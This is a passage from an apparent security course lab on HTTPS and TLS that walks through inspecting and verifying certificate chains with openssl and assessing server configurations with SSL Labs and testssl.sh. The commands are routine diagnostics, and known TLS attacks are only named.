NxJcoykeAtnbHzu01w9WR4EVBEqvgyfRxViIwd32qqejGNpoqm0RUeG/ZWuflnbR
PQIDAQAB
-----END PUBLIC KEY-----
</code></pre><h3 id=verifying-certificates>Verifying Certificates</h3><p>As the VeriSign certificate is self-signed, we can use it to verify itself:</p><pre tabindex=0><code>$ openssl verify -CAfile assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt
assets/VerisignClass1PublicPrimaryCertificationAuthority-G3.crt: OK
</code></pre><p>The <code>-CAfile</code> option points to the CA certificate to verify the current one.
As this is is a self signed certificate, we use itself as CA.</p><h2 id=https-ssl-and-tls>HTTPS, SSL and TLS</h2><p>HTTPS is the secure version of HTTP providing identity management, confidentiality and integrity.
HTTPS relies on at least the HTTP server providing a certificate that validates the identity.
The client can also do that, as part of <a href=https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html>client certificate authentication</a>.</p><p>After validating the identity of the server, the client-server pair create a secure channel by agreeing on a per-session shared symmetric encryption key.
This is negotiated via a key-exchange algorithm such as Diffie-Hellman.
Then, all traffic between client and server will be encrypted.</p><p>This entire process is facilitated by the use of SSL (<em>Secure Sockets Layer</em>) or TLS (<em>Transport Layer Security</em>).
We say that HTTPS is HTTP plus SSL / TLS support.
Note that this is the case with other secure protocol variants such as SMTPS, IMAPS, LDAPS.</p><p>SSL / TLS usually refer to the same thing.
TLS is a newer version of the protocol.
Version are SSL1.0, SSL2.0, SSL3.0, TLS1.0, TLS1.1, TLS1.2, TLS1.3.
Each newer version comes with fixes and extra security guarantees.
Nowadays (2022) all SSL versions and TLS1.0 are considered insecure.
This is due both to internal design issues and to weak cryptographic algorithms or the allowing cryptographic keys of insufficient size.</p><p>A summary of attacks on SSL / TLS is summarized as part of <a href=https://tools.ietf.org/html/rfc7457>RFC 7457</a>.
Additional information can be found <a href=https://www.acunetix.com/blog/articles/tls-vulnerabilities-attacks-final-part/>here</a> and <a href=https://www.cloudinsidr.com/content/known-attack-vectors-against-tls-implementation-vulnerabilities/>here</a>.
Well known SSL / TLS attacks are:</p><ul><li><a href=https://weakdh.org/logjam.html>Logjam</a></li><li><a href=http://backronym.fail/>BACKRONYM</a></li><li><a href=https://drownattack.com/>DROWN</a></li></ul><p>A typical target of the attacker is downgrading the connection from HTTPS to HTTP.
Or downgrading the SSL / TLS protocol version to a less secure variant.
Read more on protocol downgrade <a href=https://www.venafi.com/blog/preventing-downgrade-attacks>here</a>.</p><h3 id=capturing-inspecting-and-verifying-https-certificates>Capturing, Inspecting and Verifying HTTPS Certificates</h3><p>If you want to extract and inspect the certificate of an HTTPS server we would use the command below:</p><pre tabindex=0><code>$ openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com &lt; /dev/null
CONNECTED(00000005)
depth=2 C = US, O = Google Trust Services LLC, CN = GTS Root R1
verify return:1
depth=1 C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
verify return:1
depth=0 CN = www.google.com
verify return:1
---
Certificate chain
 0 s:CN = www.google.com
   i:C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
-----BEGIN CERTIFICATE-----
MIIEiTCCA3GgAwIBAgIRAJ8HSxF0Xxb8EiN1+lh5k/AwDQYJKoZIhvcNAQELBQAw
RjELMAkGA1UEBhMCVVMxIjAgBgNVBAoTGUdvb2dsZSBUcnVzdCBTZXJ2aWNlcyBM
TEMxEzARBgNVBAMTCkdUUyBDQSAxQzMwHhcNMjIwNjA2MDk0MDAwWhcNMjIwODI5
MDkzOTU5WjAZMRcwFQYDVQQDEw53d3cuZ29vZ2xlLmNvbTBZMBMGByqGSM49AgEG
CCqGSM49AwEHA0IABD8O7cXWSPQhh/GihqJi+gdtpS0vAt2GeDRHBaVeB8x5dDtx
3us2TGW2WJGfC7VeSVHCX1uDXkjAIOTauMUjCu2jggJoMIICZDAOBgNVHQ8BAf8E
BAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYDVR0TAQH/BAIwADAdBgNVHQ4E
FgQUWVwHKuk+m9ZD0/h/+Jsgactucp8wHwYDVR0jBBgwFoAUinR/r4XN7pXNPZzQ
4kYU83E1HScwagYIKwYBBQUHAQEEXjBcMCcGCCsGAQUFBzABhhtodHRwOi8vb2Nz
cC5wa2kuZ29vZy9ndHMxYzMwMQYIKwYBBQUHMAKGJWh0dHA6Ly9wa2kuZ29vZy9y
ZXBvL2NlcnRzL2d0czFjMy5kZXIwGQYDVR0RBBIwEIIOd3d3Lmdvb2dsZS5jb20w
IQYDVR0gBBowGDAIBgZngQwBAgEwDAYKKwYBBAHWeQIFAzA8BgNVHR8ENTAzMDGg
L6AthitodHRwOi8vY3Jscy5wa2kuZ29vZy9ndHMxYzMvUU92SjBOMXNUMkEuY3Js
MIIBBQYKKwYBBAHWeQIEAgSB9gSB8wDxAHYAUaOw9f0BeZxWbbg3eI8MpHrMGyfL
956IQpoN/tSLBeUAAAGBOJmjFwAABAMARzBFAiEA7Pub0IWm5kMWJrfJGLqP4lZU
71J6No/RLMwsvXWzVfACICJMzt/AFBsNQ1t970tVRnhmgsgz2s6deykihInBRfZR
AHcARqVV63X6kSAwtaKJafTzfREsQXS+/Um4havy/HD+bUcAAAGBOJmjPwAABAMA
SDBGAiEA92vym4NTX/SmjhAx7ICLE4KXpQFsWfhvRf1m5B6qby8CIQCVyyWh2t22
UhaaKSS+nIypJ9jWtOO4wG1gVkty8c/XETANBgkqhkiG9w0BAQsFAAOCAQEAI8fX
MKLNXXoMJk6WTJvV1ORE6kYVtyZm0wM64yV9V1zmksWDgOx9xHmoAUTQYeSq6rhI
tTxgb9EmDF8gVrOXwY31WpWjJyJQAfQcn3LhPUzJnr8yqyiwfVD1FG5gKQTTlblr
g9sZ+zfETFPXTFJeGT5yBxcT8xQDQNERblVkaQ1H5f2XYuXAJJ4vlNCu7AFil1tp
U4bau/EfQPx5Jd1bLxJwbeF9FbuQvcMeow+4ElcpC5BSkzsRk7lUbZfj7NWZas5t
3yp0UncNl+Pib3p0ooLDJ3HQvlQuL4AAg2nYkL+UKusZ9d/22RmbiyGkqr+3L/3+
PKvAVy9/DNPwW3YUbQ==
-----END CERTIFICATE-----
 1 s:C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
   i:C = US, O = Google Trust Services LLC, CN = GTS Root R1
-----BEGIN CERTIFICATE-----
MIIFljCCA36gAwIBAgINAgO8U1lrNMcY9QFQZjANBgkqhkiG9w0BAQsFADBHMQsw
CQYDVQQGEwJVUzEiMCAGA1UEChMZR29vZ2xlIFRydXN0IFNlcnZpY2VzIExMQzEU
MBIGA1UEAxMLR1RTIFJvb3QgUjEwHhcNMjAwODEzMDAwMDQyWhcNMjcwOTMwMDAw
MDQyWjBGMQswCQYDVQQGEwJVUzEiMCAGA1UEChMZR29vZ2xlIFRydXN0IFNlcnZp
Y2VzIExMQzETMBEGA1UEAxMKR1RTIENBIDFDMzCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAPWI3+dijB43+DdCkH9sh9D7ZYIl/ejLa6T/belaI+KZ9hzp
kgOZE3wJCor6QtZeViSqejOEH9Hpabu5dOxXTGZok3c3VVP+ORBNtzS7XyV3NzsX
lOo85Z3VvMO0Q+sup0fvsEQRY9i0QYXdQTBIkxu/t/bgRQIh4JZCF8/ZK2VWNAcm
BA2o/X3KLu/qSHw3TT8An4Pf73WELnlXXPxXbhqW//yMmqaZviXZf5YsBvcRKgKA
gOtjGDxQSYflispfGStZloEAoPtR28p3CwvJlk/vcEnHXG0g/Zm0tOLKLnf9LdwL
tmsTDIwZKxeWmLnwi/agJ7u2441Rj72ux5uxiZ0CAwEAAaOCAYAwggF8MA4GA1Ud
DwEB/wQEAwIBhjAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwEgYDVR0T
AQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQUinR/r4XN7pXNPZzQ4kYU83E1HScwHwYD
VR0jBBgwFoAU5K8rJnEaK0gnhS9SZizv8IkTcT4waAYIKwYBBQUHAQEEXDBaMCYG
CCsGAQUFBzABhhpodHRwOi8vb2NzcC5wa2kuZ29vZy9ndHNyMTAwBggrBgEFBQcw
AoYkaHR0cDovL3BraS5nb29nL3JlcG8vY2VydHMvZ3RzcjEuZGVyMDQGA1UdHwQt
MCswKaAnoCWGI2h0dHA6Ly9jcmwucGtpLmdvb2cvZ3RzcjEvZ3RzcjEuY3JsMFcG
A1UdIARQME4wOAYKKwYBBAHWeQIFAzAqMCgGCCsGAQUFBwIBFhxodHRwczovL3Br
aS5nb29nL3JlcG9zaXRvcnkvMAgGBmeBDAECATAIBgZngQwBAgIwDQYJKoZIhvcN
AQELBQADggIBAIl9rCBcDDy+mqhXlRu0rvqrpXJxtDaV/d9AEQNMwkYUuxQkq/BQ
cSLbrcRuf8/xam/IgxvYzolfh2yHuKkMo5uhYpSTld9brmYZCwKWnvy15xBpPnrL
RklfRuFBsdeYTWU0AIAaP0+fbH9JAIFTQaSSIYKCGvGjRFsqUBITTcFTNvNCCK9U
+o53UxtkOCcXCb1YyRt8OS1b887U7ZfbFAO/CVMkH8IMBHmYJvJh8VNS/UKMG2Yr
PxWhu//2m+OBmgEGcYk1KCTd4b3rGS3hSMs9WYNRtHTGnXzGsYZbr8w0xNPM1IER
lQCh9BIiAfq0g3GvjLeMcySsN1PCAJA/Ef5c7TaUEDu9Ka7ixzpiO2xj2YC/WXGs
Yye5TBeg2vZzFb8q3o/zpWwygTMD0IZRcZk0upONXbVRWPeyk+gB9lm+cZv9TSjO
z23HFtz30dZGm6fKa+l3D/2gthsjgx0QGtkJAITgRNOidSOzNIb2ILCkXhAd4FJG
AJ2xDx8hcFH1mt0G/FX0Kw4zd8NLQsLxdxP8c4CU6x+7Nz/OAipmsHMdMqUybDKw
juDEI/9bfU1lcKwrmz3O2+BtjjKAvpafkmO8l7tdufThcV4q5O8DIrGKZTqPwJNl
1IXNDw9bg1kWRxYtnCQ6yICmJhSFm/Y3m6xv+cXDBlHz4n/FsRC6UfTd
-----END CERTIFICATE-----
 2 s:C = US, O = Google Trust Services LLC, CN = GTS Root R1
   i:C = BE, O = GlobalSign nv-sa, OU = Root CA, CN = GlobalSign Root CA
-----BEGIN CERTIFICATE-----
MIIFYjCCBEqgAwIBAgIQd70NbNs2+RrqIQ/E8FjTDTANBgkqhkiG9w0BAQsFADBX
MQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFsU2lnbiBudi1zYTEQMA4GA1UE
CxMHUm9vdCBDQTEbMBkGA1UEAxMSR2xvYmFsU2lnbiBSb290IENBMB4XDTIwMDYx
OTAwMDA0MloXDTI4MDEyODAwMDA0MlowRzELMAkGA1UEBhMCVVMxIjAgBgNVBAoT
GUdvb2dsZSBUcnVzdCBTZXJ2aWNlcyBMTEMxFDASBgNVBAMTC0dUUyBSb290IFIx
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAthECix7joXebO9y/lD63
ladAPKH9gvl9MgaCcfb2jH/76Nu8ai6Xl6OMS/kr9rH5zoQdsfnFl97vufKj6bwS
iV6nqlKr+CMny6SxnGPb15l+8Ape62im9MZaRw1NEDPjTrETo8gYbEvs/AmQ351k
KSUjB6G00j0uYODP0gmHu81I8E3CwnqIiru6z1kZ1q+PsAewnjHxgsHA3y6mbWwZ
DrXYfiYaRQM9sHmklCitD38m5agI/pboPGiUU+6DOogrFZYJsuB6jC511pzrp1Zk
j5ZPaK49l8KEj8C8QMALXL32h7M1bKwYUH+E4EzNktMg6TO8UpmvMrUpsyUqtEj5
cuHKZPfmghCN6J3Cioj6OGaK/GP5Afl4/Xtcd/p2h/rs37EOeZVXtL0m79YB0esW
CruOC7XFxYpVq9Os6pFLKcwZpDIlTirxZUTQAs6qzkm06p98g7BAe+dDq6dso499
iYH6TKX/1Y7DzkvgtdizjkXPdsDtQCv9Uw+wp9U7DbGKogPeMa3Md+pvez7W35Ei
Eua++tgy/BBjFFFy3l3WFpO9KWgz7zpm7AeKJt8T11dleCfeXkkUAKIAf5qoIbap
sZWwpbkNFhHax2xIPEDgfg1azVY80ZcFuctL7TlLnMQ/0lUTbiSw1nH69MG6zO0b
9f6BQdgAmD06yK56mDcYBZUCAwEAAaOCATgwggE0MA4GA1UdDwEB/wQEAwIBhjAP
BgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTkrysmcRorSCeFL1JmLO/wiRNxPjAf
BgNVHSMEGDAWgBRge2YaRQ2XyolQL30EzTSo//z9SzBgBggrBgEFBQcBAQRUMFIw
JQYIKwYBBQUHMAGGGWh0dHA6Ly9vY3NwLnBraS5nb29nL2dzcjEwKQYIKwYBBQUH
MAKGHWh0dHA6Ly9wa2kuZ29vZy9nc3IxL2dzcjEuY3J0MDIGA1UdHwQrMCkwJ6Al
oCOGIWh0dHA6Ly9jcmwucGtpLmdvb2cvZ3NyMS9nc3IxLmNybDA7BgNVHSAENDAy
MAgGBmeBDAECATAIBgZngQwBAgIwDQYLKwYBBAHWeQIFAwIwDQYLKwYBBAHWeQIF
AwMwDQYJKoZIhvcNAQELBQADggEBADSkHrEoo9C0dhemMXoh6dFSPsjbdBZBiLg9
NR3t5P+T4Vxfq7vqfM/b5A3Ri1fyJm9bvhdGaJQ3b2t6yMAYN/olUazsaL+yyEn9
WprKASOshIArAoyZl+tJaox118fessmXn1hIVw41oeQa1v1vg4Fv74zPl6/AhSrw
9U5pCZEt4Wi4wStz6dTZ/CLANx8LZh1J7QJVj2fhMtfTJr9w4z30Z209fOU0iOMy
+qduBmpvvYuR7hZL6Dupszfnw0Skfths18dG9ZKb59UhvmaSGZRVbNQpsg3BZlvi
d0lIKO2d1xozclOzgjXPYovJJIultzkMu34qQb9Sz/yilrbCgj8=
-----END CERTIFICATE-----
---
Server certificate
subject=CN = www.google.com

issuer=C = US, O = Google Trust Services LLC, CN = GTS CA 1C3

---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: ECDSA
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 4295 bytes and written 396 bytes
Verification: OK
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 256 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)
---
DONE
</code></pre><p>The command is pretty verbose.
We can make it print just the certificates by using:</p><pre tabindex=0><code>$ openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com &lt; /dev/null 2&gt; /dev/null | sed -ne &#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&#39;
-----BEGIN CERTIFICATE-----
MIIEiTCCA3GgAwIBAgIRAJ8HSxF0Xxb8EiN1+lh5k/AwDQYJKoZIhvcNAQELBQAw
RjELMAkGA1UEBhMCVVMxIjAgBgNVBAoTGUdvb2dsZSBUcnVzdCBTZXJ2aWNlcyBM
TEMxEzARBgNVBAMTCkdUUyBDQSAxQzMwHhcNMjIwNjA2MDk0MDAwWhcNMjIwODI5
MDkzOTU5WjAZMRcwFQYDVQQDEw53d3cuZ29vZ2xlLmNvbTBZMBMGByqGSM49AgEG
CCqGSM49AwEHA0IABD8O7cXWSPQhh/GihqJi+gdtpS0vAt2GeDRHBaVeB8x5dDtx
3us2TGW2WJGfC7VeSVHCX1uDXkjAIOTauMUjCu2jggJoMIICZDAOBgNVHQ8BAf8E
BAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwEwDAYDVR0TAQH/BAIwADAdBgNVHQ4E
FgQUWVwHKuk+m9ZD0/h/+Jsgactucp8wHwYDVR0jBBgwFoAUinR/r4XN7pXNPZzQ
4kYU83E1HScwagYIKwYBBQUHAQEEXjBcMCcGCCsGAQUFBzABhhtodHRwOi8vb2Nz
cC5wa2kuZ29vZy9ndHMxYzMwMQYIKwYBBQUHMAKGJWh0dHA6Ly9wa2kuZ29vZy9y
ZXBvL2NlcnRzL2d0czFjMy5kZXIwGQYDVR0RBBIwEIIOd3d3Lmdvb2dsZS5jb20w
IQYDVR0gBBowGDAIBgZngQwBAgEwDAYKKwYBBAHWeQIFAzA8BgNVHR8ENTAzMDGg
L6AthitodHRwOi8vY3Jscy5wa2kuZ29vZy9ndHMxYzMvUU92SjBOMXNUMkEuY3Js
MIIBBQYKKwYBBAHWeQIEAgSB9gSB8wDxAHYAUaOw9f0BeZxWbbg3eI8MpHrMGyfL
956IQpoN/tSLBeUAAAGBOJmjFwAABAMARzBFAiEA7Pub0IWm5kMWJrfJGLqP4lZU
71J6No/RLMwsvXWzVfACICJMzt/AFBsNQ1t970tVRnhmgsgz2s6deykihInBRfZR
AHcARqVV63X6kSAwtaKJafTzfREsQXS+/Um4havy/HD+bUcAAAGBOJmjPwAABAMA
SDBGAiEA92vym4NTX/SmjhAx7ICLE4KXpQFsWfhvRf1m5B6qby8CIQCVyyWh2t22
UhaaKSS+nIypJ9jWtOO4wG1gVkty8c/XETANBgkqhkiG9w0BAQsFAAOCAQEAI8fX
MKLNXXoMJk6WTJvV1ORE6kYVtyZm0wM64yV9V1zmksWDgOx9xHmoAUTQYeSq6rhI
tTxgb9EmDF8gVrOXwY31WpWjJyJQAfQcn3LhPUzJnr8yqyiwfVD1FG5gKQTTlblr
g9sZ+zfETFPXTFJeGT5yBxcT8xQDQNERblVkaQ1H5f2XYuXAJJ4vlNCu7AFil1tp
U4bau/EfQPx5Jd1bLxJwbeF9FbuQvcMeow+4ElcpC5BSkzsRk7lUbZfj7NWZas5t
3yp0UncNl+Pib3p0ooLDJ3HQvlQuL4AAg2nYkL+UKusZ9d/22RmbiyGkqr+3L/3+
PKvAVy9/DNPwW3YUbQ==
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIFljCCA36gAwIBAgINAgO8U1lrNMcY9QFQZjANBgkqhkiG9w0BAQsFADBHMQsw
CQYDVQQGEwJVUzEiMCAGA1UEChMZR29vZ2xlIFRydXN0IFNlcnZpY2VzIExMQzEU
MBIGA1UEAxMLR1RTIFJvb3QgUjEwHhcNMjAwODEzMDAwMDQyWhcNMjcwOTMwMDAw
MDQyWjBGMQswCQYDVQQGEwJVUzEiMCAGA1UEChMZR29vZ2xlIFRydXN0IFNlcnZp
Y2VzIExMQzETMBEGA1UEAxMKR1RTIENBIDFDMzCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAPWI3+dijB43+DdCkH9sh9D7ZYIl/ejLa6T/belaI+KZ9hzp
kgOZE3wJCor6QtZeViSqejOEH9Hpabu5dOxXTGZok3c3VVP+ORBNtzS7XyV3NzsX
lOo85Z3VvMO0Q+sup0fvsEQRY9i0QYXdQTBIkxu/t/bgRQIh4JZCF8/ZK2VWNAcm
BA2o/X3KLu/qSHw3TT8An4Pf73WELnlXXPxXbhqW//yMmqaZviXZf5YsBvcRKgKA
gOtjGDxQSYflispfGStZloEAoPtR28p3CwvJlk/vcEnHXG0g/Zm0tOLKLnf9LdwL
tmsTDIwZKxeWmLnwi/agJ7u2441Rj72ux5uxiZ0CAwEAAaOCAYAwggF8MA4GA1Ud
DwEB/wQEAwIBhjAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwEgYDVR0T
AQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQUinR/r4XN7pXNPZzQ4kYU83E1HScwHwYD
VR0jBBgwFoAU5K8rJnEaK0gnhS9SZizv8IkTcT4waAYIKwYBBQUHAQEEXDBaMCYG
CCsGAQUFBzABhhpodHRwOi8vb2NzcC5wa2kuZ29vZy9ndHNyMTAwBggrBgEFBQcw
AoYkaHR0cDovL3BraS5nb29nL3JlcG8vY2VydHMvZ3RzcjEuZGVyMDQGA1UdHwQt
MCswKaAnoCWGI2h0dHA6Ly9jcmwucGtpLmdvb2cvZ3RzcjEvZ3RzcjEuY3JsMFcG
A1UdIARQME4wOAYKKwYBBAHWeQIFAzAqMCgGCCsGAQUFBwIBFhxodHRwczovL3Br
aS5nb29nL3JlcG9zaXRvcnkvMAgGBmeBDAECATAIBgZngQwBAgIwDQYJKoZIhvcN
AQELBQADggIBAIl9rCBcDDy+mqhXlRu0rvqrpXJxtDaV/d9AEQNMwkYUuxQkq/BQ
cSLbrcRuf8/xam/IgxvYzolfh2yHuKkMo5uhYpSTld9brmYZCwKWnvy15xBpPnrL
RklfRuFBsdeYTWU0AIAaP0+fbH9JAIFTQaSSIYKCGvGjRFsqUBITTcFTNvNCCK9U
+o53UxtkOCcXCb1YyRt8OS1b887U7ZfbFAO/CVMkH8IMBHmYJvJh8VNS/UKMG2Yr
PxWhu//2m+OBmgEGcYk1KCTd4b3rGS3hSMs9WYNRtHTGnXzGsYZbr8w0xNPM1IER
lQCh9BIiAfq0g3GvjLeMcySsN1PCAJA/Ef5c7TaUEDu9Ka7ixzpiO2xj2YC/WXGs
Yye5TBeg2vZzFb8q3o/zpWwygTMD0IZRcZk0upONXbVRWPeyk+gB9lm+cZv9TSjO
z23HFtz30dZGm6fKa+l3D/2gthsjgx0QGtkJAITgRNOidSOzNIb2ILCkXhAd4FJG
AJ2xDx8hcFH1mt0G/FX0Kw4zd8NLQsLxdxP8c4CU6x+7Nz/OAipmsHMdMqUybDKw
juDEI/9bfU1lcKwrmz3O2+BtjjKAvpafkmO8l7tdufThcV4q5O8DIrGKZTqPwJNl
1IXNDw9bg1kWRxYtnCQ6yICmJhSFm/Y3m6xv+cXDBlHz4n/FsRC6UfTd
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIFYjCCBEqgAwIBAgIQd70NbNs2+RrqIQ/E8FjTDTANBgkqhkiG9w0BAQsFADBX
MQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFsU2lnbiBudi1zYTEQMA4GA1UE
CxMHUm9vdCBDQTEbMBkGA1UEAxMSR2xvYmFsU2lnbiBSb290IENBMB4XDTIwMDYx
OTAwMDA0MloXDTI4MDEyODAwMDA0MlowRzELMAkGA1UEBhMCVVMxIjAgBgNVBAoT
GUdvb2dsZSBUcnVzdCBTZXJ2aWNlcyBMTEMxFDASBgNVBAMTC0dUUyBSb290IFIx
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAthECix7joXebO9y/lD63
ladAPKH9gvl9MgaCcfb2jH/76Nu8ai6Xl6OMS/kr9rH5zoQdsfnFl97vufKj6bwS
iV6nqlKr+CMny6SxnGPb15l+8Ape62im9MZaRw1NEDPjTrETo8gYbEvs/AmQ351k
KSUjB6G00j0uYODP0gmHu81I8E3CwnqIiru6z1kZ1q+PsAewnjHxgsHA3y6mbWwZ
DrXYfiYaRQM9sHmklCitD38m5agI/pboPGiUU+6DOogrFZYJsuB6jC511pzrp1Zk
j5ZPaK49l8KEj8C8QMALXL32h7M1bKwYUH+E4EzNktMg6TO8UpmvMrUpsyUqtEj5
cuHKZPfmghCN6J3Cioj6OGaK/GP5Afl4/Xtcd/p2h/rs37EOeZVXtL0m79YB0esW
CruOC7XFxYpVq9Os6pFLKcwZpDIlTirxZUTQAs6qzkm06p98g7BAe+dDq6dso499
iYH6TKX/1Y7DzkvgtdizjkXPdsDtQCv9Uw+wp9U7DbGKogPeMa3Md+pvez7W35Ei
Eua++tgy/BBjFFFy3l3WFpO9KWgz7zpm7AeKJt8T11dleCfeXkkUAKIAf5qoIbap
sZWwpbkNFhHax2xIPEDgfg1azVY80ZcFuctL7TlLnMQ/0lUTbiSw1nH69MG6zO0b
9f6BQdgAmD06yK56mDcYBZUCAwEAAaOCATgwggE0MA4GA1UdDwEB/wQEAwIBhjAP
BgNVHRMBAf8EBTADAQH/MB0GA1UdDgQWBBTkrysmcRorSCeFL1JmLO/wiRNxPjAf
BgNVHSMEGDAWgBRge2YaRQ2XyolQL30EzTSo//z9SzBgBggrBgEFBQcBAQRUMFIw
JQYIKwYBBQUHMAGGGWh0dHA6Ly9vY3NwLnBraS5nb29nL2dzcjEwKQYIKwYBBQUH
MAKGHWh0dHA6Ly9wa2kuZ29vZy9nc3IxL2dzcjEuY3J0MDIGA1UdHwQrMCkwJ6Al
oCOGIWh0dHA6Ly9jcmwucGtpLmdvb2cvZ3NyMS9nc3IxLmNybDA7BgNVHSAENDAy
MAgGBmeBDAECATAIBgZngQwBAgIwDQYLKwYBBAHWeQIFAwIwDQYLKwYBBAHWeQIF
AwMwDQYJKoZIhvcNAQELBQADggEBADSkHrEoo9C0dhemMXoh6dFSPsjbdBZBiLg9
NR3t5P+T4Vxfq7vqfM/b5A3Ri1fyJm9bvhdGaJQ3b2t6yMAYN/olUazsaL+yyEn9
WprKASOshIArAoyZl+tJaox118fessmXn1hIVw41oeQa1v1vg4Fv74zPl6/AhSrw
9U5pCZEt4Wi4wStz6dTZ/CLANx8LZh1J7QJVj2fhMtfTJr9w4z30Z209fOU0iOMy
+qduBmpvvYuR7hZL6Dupszfnw0Skfths18dG9ZKb59UhvmaSGZRVbNQpsg3BZlvi
d0lIKO2d1xozclOzgjXPYovJJIultzkMu34qQb9Sz/yilrbCgj8=
-----END CERTIFICATE-----
</code></pre><p>There are three certificates.
This is because the server is using a certificate chain.
A <strong>certificate chain</strong> is when the CA signs and intermediate certificate which will then sign the actual certificate.
Or multiple intermediate certificates.
This is used to decentralize the certificate signing process, creating the hierarchical public key infrastructure with self signed root CAs at the top.</p><p>We store the three certificates from Google in the <code>assets/</code> folder.
We inspect the subject and issuer of each:</p><pre tabindex=0><code>$ openssl x509 -noout -subject -issuer -in assets/google.crt
subject=CN = www.google.com
issuer=C = US, O = Google Trust Services LLC, CN = GTS CA 1C3

$ openssl x509 -noout -subject -issuer -in assets/google_interm2.crt
subject=C = US, O = Google Trust Services LLC, CN = GTS CA 1C3
issuer=C = US, O = Google Trust Services LLC, CN = GTS Root R1

$ openssl x509 -noout -subject -issuer -in assets/google_interm1.crt
subject=C = US, O = Google Trust Services LLC, CN = GTS Root R1
issuer=C = BE, O = GlobalSign nv-sa, OU = Root CA, CN = GlobalSign Root CA
</code></pre><p>The server certificate is for <code>www.google.com</code> and is issued and signed by <code>C = US, O = Google Trust Services LLC, CN = GTS CA 1C3</code>, who in turn is signed by <code>C = US, O = Google Trust Services LLC, CN = GTS Root R1</code>, who in turn is signed by the GlobalSign Root CA.
We extracted the GlobalSign Root CA from Firefox and placed it in the <code>assets/</code> folder as well:</p><pre tabindex=0><code>$ openssl x509 -noout -subject -issuer -in assets/GlobalSignRootCA.crt
subject=C = BE, O = GlobalSign nv-sa, OU = Root CA, CN = GlobalSign Root CA
issuer=C = BE, O = GlobalSign nv-sa, OU = Root CA, CN = GlobalSign Root CA
</code></pre><p>To verify the entire security chain we use:</p><pre tabindex=0><code>$ cat google.crt google_interm2.crt google_interm1.crt &gt; google_chain.crt
$ openssl verify -CAfile google_interm2.crt google_chain.crt
google_chain.crt: OK
</code></pre><p>The first command creates the <code>google_chain.crt</code> file with the chain of certificates, the most specific certificate first.
The we use <code>openssl verify</code> to successfully verify the certificate chain.</p><h3 id=validation-and-assessment-of-remote-certificates>Validation and Assessment of Remote Certificates</h3><p>Mostly for testing purposes, we want to know whether a given HTTPS server setup is valid and whether it is secure (i.e. it uses strong TLS parameters).
For this we can use the <a href=https://www.ssllabs.com/ssltest/>SSLTest Web App</a> or the <a href=https://testssl.sh/><code>testssl.sh</code> CLI tool</a>.</p><p><strong>SSLTest</strong></p><p>Using <a href=https://www.ssllabs.com/ssltest/>SSLTest</a> is quite easy.
Enter the URL of the target web server and then wait for the results.
Results come in a grade summary, that&rsquo;s an average of several criteria, and a detailed analysis of the HTTPS security features.</p><p>Generally, it is advised to aim for a higher score.
Note that a higher score may mean using certain security features that some browsers don&rsquo;t support.
So there needs to be a trade-off between security and browser support.</p><p><strong>testssl.sh</strong></p><p>Installing <code>testssl.sh</code> is as simple as cloning <a href=https://github.com/drwetter/testssl.sh>the repository</a> and changing to a stable branch:</p><pre tabindex=0><code>$ git clone https://github.com/drwetter/testssl.sh
[...]

$ cd testssl.sh/

$ git checkout -b v3.0.7 v3.0.7
</code></pre><p>Now just pass an URL to the <code>testssl.sh</code> script:</p><pre tabindex=0><code>$ ./testssl.sh security.cs.pub.ro
</code></pre><p>If that doesn&rsquo;t work, you can use Docker as detailed in <a href=https://github.com/drwetter/testssl.sh>the repository</a>.</p><p>The output is similar to the one from SSLTest.
The benefit of using <code>testssl.sh</code> is it allows automation and it doesn&rsquo;t require a GUI browser to do the test.</p><h2 id=summary-of-commands>Summary of Commands</h2><p>See below a summary of commands useful for working with HTTPS and digital certificates.</p><p>Capture HTTP packets and print their contents (ash human-readable ASCII characters):</p><pre tabindex=0><code>$ sudo tcpdump -A tcp port 80
</code></pre><p>Get remote web page:</p><pre tabindex=0><code>$ wget http://www.google.com

$ wget https://www.google.com

$ curl http://www.google.com

$ curl https://www.google.com
</code></pre><p>Inspect certificate file:</p><pre tabindex=0><code>$ openssl x509 -noout -text -in certificate.crt

$ openssl x509 -noout -subject -issuer -in certificate.crt
</code></pre><p>Verify certificate:</p><pre tabindex=0><code>$ openssl verify -CAfile CA.crt certificate.crt
</code></pre><p>Extract certificate(s) from remote end:</p><pre tabindex=0><code>$ openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com &lt; /dev/null 2&gt; /dev/null | sed -ne &#39;/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p&#39;
</code></pre><p>Assess remote HTTPS and certificate security:</p><pre tabindex=0><code>$ ./testssl.sh security.cs.pub.ro
</code></pre><h2 id=challenges>Challenges</h2><h3 id=01-investigate-ssltls-enabled-websites>01. Investigate SSL/TLS-enabled Websites</h3><p>Investigate the SSL/TLS configuration strength for different websites.
